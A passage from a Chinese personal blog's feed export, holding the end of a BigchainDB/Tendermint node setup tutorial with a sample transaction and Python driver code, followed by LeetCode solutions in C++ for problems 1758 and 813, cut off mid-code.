class="string">&quot;26656:26656&quot;</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&quot;26657:26657&quot;</span></span><br><span class="line">    <span class="attr">command:</span> <span class="string">sh</span> <span class="string">-c</span> <span class="string">&quot;tendermint init &amp;&amp; tendermint node --consensus.create_empty_blocks=false --proxy_app=tcp://bigchaindb:26658&quot;</span></span><br></pre></td></tr></table></figure><h3 id="使用tendermint生成配置文件"><a href="#使用tendermint生成配置文件" class="headerlink" title="使用tendermint生成配置文件"></a>使用tendermint生成配置文件</h3><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tendermint testnet</span><br></pre></td></tr></table></figure><ul><li>修改生成的配置文件，写入节点实际ip</li></ul><h3 id="启动"><a href="#启动" class="headerlink" title="启动"></a>启动</h3><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure><h2 id="step3-测试"><a href="#step3-测试" class="headerlink" title="step3. 测试"></a>step3. 测试</h2><ul><li><p>使用postman发送测试Post交易</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;asset&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;data&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">      <span class="attr">&quot;msg&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Hello BigchainDB!&quot;</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line">  <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;id&quot;</span><span class="punctuation">:</span> <span class="string">&quot;4957744b3ac54434b8270f2c854cc1040228c82ea4e72d66d2887a4d3e30b317&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;inputs&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">    <span class="punctuation">&#123;</span></span><br><span class="line">      <span class="attr">&quot;fulfillment&quot;</span><span class="punctuation">:</span> <span class="string">&quot;pGSAIDE5i63cn4X8T8N1sZ2mGkJD5lNRnBM4PZgI_zvzbr-cgUCy4BR6gKaYT-tdyAGPPpknIqI4JYQQ-p2nCg3_9BfOI-15vzldhyz-j_LZVpqAlRmbTzKS-Q5gs7ZIFaZCA_UD&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;fulfills&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">null</span></span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;owners_before&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">        <span class="string">&quot;4K9sWUMFwTgaDGPfdynrbxWqWS6sWmKbZoTjxLtVUibD&quot;</span></span><br><span class="line">      <span class="punctuation">]</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line">  <span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;metadata&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;sequence&quot;</span><span class="punctuation">:</span> <span class="number">0</span></span><br><span class="line">  <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;operation&quot;</span><span class="punctuation">:</span> <span class="string">&quot;CREATE&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;outputs&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">    <span class="punctuation">&#123;</span></span><br><span class="line">      <span class="attr">&quot;amount&quot;</span><span class="punctuation">:</span> <span class="string">&quot;1&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;condition&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;details&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">          <span class="attr">&quot;public_key&quot;</span><span class="punctuation">:</span> <span class="string">&quot;4K9sWUMFwTgaDGPfdynrbxWqWS6sWmKbZoTjxLtVUibD&quot;</span><span class="punctuation">,</span></span><br><span class="line">          <span class="attr">&quot;type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;ed25519-sha-256&quot;</span></span><br><span class="line">        <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;uri&quot;</span><span class="punctuation">:</span> <span class="string">&quot;ni:///sha-256;PNYwdxaRaNw60N6LDFzOWO97b8tJeragczakL8PrAPc?fpt=ed25519-sha-256&amp;cost=131072&quot;</span></span><br><span class="line">      <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;public_keys&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">        <span class="string">&quot;4K9sWUMFwTgaDGPfdynrbxWqWS6sWmKbZoTjxLtVUibD&quot;</span></span><br><span class="line">      <span class="punctuation">]</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line">  <span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;version&quot;</span><span class="punctuation">:</span> <span class="string">&quot;2.0&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure></li><li><p>查询交易</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost::9984/api/v1/assets/?search=Hello BigchainDB</span><br></pre></td></tr></table></figure></li></ul><h2 id="step4-bigchaindb-driver"><a href="#step4-bigchaindb-driver" class="headerlink" title="step4. bigchaindb_driver"></a>step4. bigchaindb_driver</h2><ul><li>python的api</li></ul><h3 id="安装依赖"><a href="#安装依赖" class="headerlink" title="安装依赖"></a>安装依赖</h3><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pip3 install --upgrade setuptools</span><br><span class="line">sudo apt-get install python3-dev libssl-dev libffi-dev</span><br><span class="line">pip3 install python-rapidjson PyNaCl</span><br></pre></td></tr></table></figure><h3 id="安装driver"><a href="#安装driver" class="headerlink" title="安装driver"></a>安装driver</h3><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip3 install bigchaindb_driver</span><br></pre></td></tr></table></figure><h3 id="运行测试代码"><a href="#运行测试代码" class="headerlink" title="运行测试代码"></a>运行测试代码</h3><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># import BigchainDB and create an object</span></span><br><span class="line"><span class="keyword">from</span> bigchaindb_driver <span class="keyword">import</span> BigchainDB</span><br><span class="line">bdb_root_url = <span class="string">&#x27;https://example.com:9984&#x27;</span></span><br><span class="line">bdb = BigchainDB(bdb_root_url)</span><br><span class="line"></span><br><span class="line"><span class="comment"># generate a keypair</span></span><br><span class="line"><span class="keyword">from</span> bigchaindb_driver.crypto <span class="keyword">import</span> generate_keypair</span><br><span class="line">alice, bob = generate_keypair(), generate_keypair()</span><br><span class="line"></span><br><span class="line"><span class="comment"># create a digital asset for Alice</span></span><br><span class="line">game_boy_token = &#123;</span><br><span class="line">    <span class="string">&#x27;data&#x27;</span>: &#123;</span><br><span class="line">        <span class="string">&#x27;token_for&#x27;</span>: &#123;</span><br><span class="line">            <span class="string">&#x27;game_boy&#x27;</span>: &#123;</span><br><span class="line">                <span class="string">&#x27;serial_number&#x27;</span>: <span class="string">&#x27;LR35902&#x27;</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="string">&#x27;description&#x27;</span>: <span class="string">&#x27;Time share token. Each token equals one hour of usage.&#x27;</span>,</span><br><span class="line">    &#125;,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># prepare the transaction with the digital asset and issue 10 tokens for Bob</span></span><br><span class="line">prepared_token_tx = bdb.transactions.prepare(</span><br><span class="line">    operation=<span class="string">&#x27;CREATE&#x27;</span>,</span><br><span class="line">    signers=alice.public_key,</span><br><span class="line">    recipients=[([bob.public_key], <span class="number">10</span>)],</span><br><span class="line">    asset=game_boy_token)</span><br><span class="line"></span><br><span class="line"><span class="comment"># fulfill and send the transaction</span></span><br><span class="line">fulfilled_token_tx = bdb.transactions.fulfill(</span><br><span class="line">    prepared_token_tx,</span><br><span class="line">    private_keys=alice.private_key)</span><br><span class="line">bdb.transactions.send_commit(fulfilled_token_tx)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Use the tokens</span></span><br><span class="line"><span class="comment"># create the output and inout for the transaction</span></span><br><span class="line">transfer_asset = &#123;<span class="string">&#x27;id&#x27;</span>: fulfilled_token_tx[<span class="string">&#x27;id&#x27;</span>]&#125;</span><br><span class="line">output_index = <span class="number">0</span></span><br><span class="line">output = fulfilled_token_tx[<span class="string">&#x27;outputs&#x27;</span>][output_index]</span><br><span class="line">transfer_input = &#123;<span class="string">&#x27;fulfillment&#x27;</span>: output[<span class="string">&#x27;condition&#x27;</span>][<span class="string">&#x27;details&#x27;</span>],</span><br><span class="line">                  <span class="string">&#x27;fulfills&#x27;</span>: &#123;<span class="string">&#x27;output_index&#x27;</span>: output_index,</span><br><span class="line">                               <span class="string">&#x27;transaction_id&#x27;</span>: transfer_asset[<span class="string">&#x27;id&#x27;</span>]&#125;,</span><br><span class="line">                  <span class="string">&#x27;owners_before&#x27;</span>: output[<span class="string">&#x27;public_keys&#x27;</span>]&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># prepare the transaction and use 3 tokens</span></span><br><span class="line">prepared_transfer_tx = bdb.transactions.prepare(</span><br><span class="line">    operation=<span class="string">&#x27;TRANSFER&#x27;</span>,</span><br><span class="line">    asset=transfer_asset,</span><br><span class="line">    inputs=transfer_input,</span><br><span class="line">    recipients=[([alice.public_key], <span class="number">3</span>), ([bob.public_key], <span class="number">7</span>)])</span><br><span class="line"></span><br><span class="line"><span class="comment"># fulfill and send the transaction</span></span><br><span class="line">fulfilled_transfer_tx = bdb.transactions.fulfill(</span><br><span class="line">    prepared_transfer_tx,</span><br><span class="line">    private_keys=bob.private_key)</span><br><span class="line">sent_transfer_tx = bdb.transactions.send_commit(fulfilled_transfer_tx)</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;step1-构建一个BigChainDB节点&quot;&gt;&lt;a href=&quot;#step1-构建一个BigChainDB节点&quot; class=&quot;headerlink&quot; title=&quot;step1. 构建一个BigChainDB节点&quot;&gt;&lt;/a&gt;step1. 构建一个BigChainDB节点&lt;/h2&gt;&lt;h3 id=&quot;使用All-in-One-Docker搭建&quot;&gt;&lt;a href=&quot;#使用All-in-One-Docker搭建&quot; class=&quot;headerlink&quot; title=&quot;使用All-in-One Docker搭建&quot;&gt;&lt;/a&gt;使用All-in-One Docker搭建&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;拉取镜像&lt;/li&gt;
&lt;/ul&gt;
&lt;figure class=&quot;highlight sh&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;docker pull bigchaindb/bigchaindb:all-in-one&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;ul&gt;
&lt;li&gt;运行&lt;figure class=&quot;highlight sh&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;docker run \&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  --detach \&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  --name bigchaindb \&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  --publish 9984:9984 \&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  --publish 9985:9985 \&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  --publish 27017:27017 \&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  --publish 26657:26657 \&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  --volume &lt;span class=&quot;variable&quot;&gt;$HOME&lt;/span&gt;/bigchaindb_docker/mongodb/data/db:/data/db \&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  --volume &lt;span class=&quot;variable&quot;&gt;$HOME&lt;/span&gt;/bigchaindb_docker/mongodb/data/configdb:/data/configdb \&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  --volume &lt;span class=&quot;variable&quot;&gt;$HOME&lt;/span&gt;/bigchaindb_docker/tendermint:/tendermint \&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  bigchaindb/bigchaindb:all-in-one&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&quot;使用Ansible一键脚本搭建&quot;&gt;&lt;a href=&quot;#使用Ansible一键脚本搭建&quot; class=&quot;headerlink&quot; title=&quot;使用Ansible一键脚本搭建&quot;&gt;&lt;/a&gt;使用Ansible一键脚本搭建&lt;/h3&gt;</summary>
    
    
    
    <category term="组会" scheme="https://jingtianer.github.io/home/categories/%E7%BB%84%E4%BC%9A/"/>
    
    
    <category term="组会" scheme="https://jingtianer.github.io/home/tags/%E7%BB%84%E4%BC%9A/"/>
    
    <category term="BigChain DB" scheme="https://jingtianer.github.io/home/tags/BigChain-DB/"/>
    
  </entry>
  
  <entry>
    <title>LeetCode-20</title>
    <link href="https://jingtianer.github.io/home/2022/11/28/LeetCode/LeetCode-%E5%88%B7%E9%A2%98%E6%80%BB%E7%BB%9320/"/>
    <id>https://jingtianer.github.io/home/2022/11/28/LeetCode/LeetCode-%E5%88%B7%E9%A2%98%E6%80%BB%E7%BB%9320/</id>
    <published>2022-11-28T03:14:34.000Z</published>
    <updated>2022-11-30T01:07:08.968Z</updated>
    
    <content type="html"><![CDATA[<h2 id="1758-生成交替二进制字符串的最少操作数"><a href="#1758-生成交替二进制字符串的最少操作数" class="headerlink" title="1758. 生成交替二进制字符串的最少操作数"></a><a href="https://leetcode.cn/problems/minimum-changes-to-make-alternating-binary-string/">1758. 生成交替二进制字符串的最少操作数</a></h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">minOperations</span><span class="params">(string s)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> len = s.<span class="built_in">size</span>();</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">min</span>(<span class="built_in">cal</span>(s, len, <span class="literal">true</span>), <span class="built_in">cal</span>(s, len, <span class="literal">false</span>));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">cal</span><span class="params">(<span class="type">const</span> string&amp; s, <span class="type">int</span> len, <span class="type">bool</span> flag)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> count = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; len; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span>(flag &amp;&amp; s[i] == <span class="string">&#x27;0&#x27;</span> || !flag &amp;&amp; s[i] == <span class="string">&#x27;1&#x27;</span>) &#123;</span><br><span class="line">                count++;</span><br><span class="line">            &#125;</span><br><span class="line">            flag = !flag;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> count;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="813-最大平均值和的分组"><a href="#813-最大平均值和的分组" class="headerlink" title="813. 最大平均值和的分组"></a><a href="https://leetcode.cn/problems/largest-sum-of-averages/">813. 最大平均值和的分组</a></h2><h3 id="超时暴搜"><a href="#超时暴搜" class="headerlink" title="超时暴搜"></a>超时暴搜</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="type">int</span> len = <span class="number">0</span>;</span><br><span class="line">    vector&lt;<span class="type">int</span>&gt; sum;</span><br><span class="line">    <span class="function"><span class="type">double</span> <span class="title">largestSumOfAverages</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; nums, <span class="type">int</span> k)</span> </span>&#123;</span><br><span class="line">        len = nums.<span class="built_in">size</span>();</span><br><span class="line">        sum = <span class="built_in">vector</span>&lt;<span class="type">int</span>&gt;(len+<span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">1</span>; i &lt;= len; i++) &#123;</span><br><span class="line">            sum[i] = nums[i<span class="number">-1</span>] + sum[i<span class="number">-1</span>];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">search</span>(nums, k, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="type">double</span> <span class="title">search</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; nums, <span class="type">int</span> k, <span class="type">int</span> i, <span class="type">int</span> K, <span class="type">double</span> left_value, <span class="type">int</span> last_j)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(k == K || i == len) &#123;</span><br><span class="line">            <span class="keyword">return</span> left_value + (sum[len] - sum[last_j] + <span class="number">0.0</span>) / (len - last_j);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">max</span>(<span class="built_in">search</span>(nums, k, i+<span class="number">1</span>, K+<span class="number">1</span>, left_value + (sum[i] - sum[last_j] + <span class="number">0.0</span>)/(i-last_j), i), <span class="built_in">search</span>(nums, k,i+<span class="number">1</span>, K, left_value, last_j));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="type">double</span> <span class="title">max</span><span class="params">(<span class="type">double</span> a, <span class="type">double</span> b)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> a &gt; b ? a : b;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><blockquote><p>昨天第一个思路是用排序，找出最大的m个数，这m个数恰好将数组分成k个部分，发现不可行。<br>然后暴力搜索，超时了，暴搜时考虑添加隔板，其中left_value表示当前搜索下标i之前的分组平均值</p></blockquote><h3 id="类似背包"><a href="#类似背包" class="headerlink" title="类似背包"></a>类似背包</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">double</span> <span class="title">largestSumOfAverages</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; nums, <span class="type">int</span> k)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> len = nums.<span class="built_in">size</span>();</span><br><span class="line">        <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">sum</span><span class="params">(len+<span class="number">1</span>, <span class="number">0</span>)</span></span>;</span><br><span class="line">        vector&lt;vector&lt;<span class="type">double</span>&gt;&gt; <span class="built_in">left_avg</span>(k<span class="number">-1</span>, <span class="built_in">vector</span>&lt;<span class="type">double</span>&gt;(len, <span class="number">0</span>));</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">1</span>; i &lt;= len; i++) &#123;</span><br><span class="line">            sum[i] = nums[i<span class="number">-1</span>] + sum[i<span class="number">-1</span>];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">double</span> maxx = sum[len] / (len + <span class="number">0.0</span>);</span><br><span class="line">        <span class="keyword">if</span>(k &lt;= <span class="number">1</span>) <span class="keyword">return</span> maxx;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">1</span>; i &lt; len; i++) &#123;</span><br><span class="line">            left_avg[<span class="number">0</span>][i] = <span class="built_in">double</span>(sum[i])/i;</span><br><span class="line">            maxx = <span class="built_in">max</span>(maxx, left_avg[<span class="number">0</span>][i] + <span class="built_in">double</span>(sum[len] - sum[i])/(len-i));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; k<span class="number">-2</span>; i++) &#123; <span class="comment">//第几个隔板</span></span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> j = i+<span class="number">1</span>; j &lt; len; j++) &#123; <span class="comment">// 前一个隔板的位置</span></span><br><span class="line">                <span class="keyword">for</span>(<span class="type">int</span> p = j+<span class="number">1</span>; p &lt; len; p++) &#123; <span class="comment">// 现在隔板的位置</span></span><br><span class="line">                    maxx = <span class="built_in">max</span>(left_avg[i][j] + <span class="built_in">double</span>(sum[p] - sum[j])/(p-j) + <span class="built_in">double</span>(sum[len] - sum[p])/(len-p), maxx);</span><br><span class="line">                    <span class="comment">// left_avg + 当前隔板与上一个隔板的avg， 最后一个数到当前隔板的avg</span></span><br><span class="line">                    left_avg[i+<span class="number">1</span>][p] = <span class="built_in">max</span>(left_avg[i][j] + <span class="built_in">double</span>(sum[p] - sum[j])/(p-j), left_avg[i+<span class="number">1</span>][p]);</span><br><span class="line">                    <span class="comment">// 更新avg</span></span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> maxx;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><blockquote><p>今天考虑用类似背包的想法，结合暴力搜索的left_avg，用$ left_avg[i][j] $ ，表示添加i个隔板，在j之前的最大left_avg<br>从第二个隔板开始，假设第i个隔板分别在位置 $j &#x3D; i+1,i+2,i+3 …$ 时，第 $i+1$个隔板可以在 $p &#x3D; j+1, j+2, …$<br>计算前后两个隔板各种情况的最大值，更新left_avg，更新maxx</p></blockquote><h3 id="优化"><a href="#优化" class="headerlink" title="优化"></a>优化</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">double</span> <span class="title">largestSumOfAverages</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; nums, <span class="type">int</span> k)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> len = nums.<span class="built_in">size</span>();</span><br><span class="line">        <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">sum</span><span class="params">(len+<span class="number">1</span>, <span class="number">0</span>)</span></span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">1</span>; i &lt;= len; i++) &#123;</span><br><span class="line">            sum[i] = nums[i<span class="number">-1</span>] + sum[i<span class="number">-1</span>];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(k &lt;= <span class="number">1</span>) <span class="keyword">return</span> sum[len] / (len + <span class="number">0.0</span>);</span><br><span class="line">        vector&lt;vector&lt;<span class="type">double</span>&gt;&gt; <span class="built_in">left_avg</span>(k<span class="number">-1</span>, <span class="built_in">vector</span>&lt;<span class="type">double</span>&gt;(len, <span class="number">0</span>));</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">1</span>; i &lt; len; i++) &#123;</span><br><span class="line">            left_avg[<span class="number">0</span>][i] = <span class="built_in">double</span>(sum[i])/i;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; 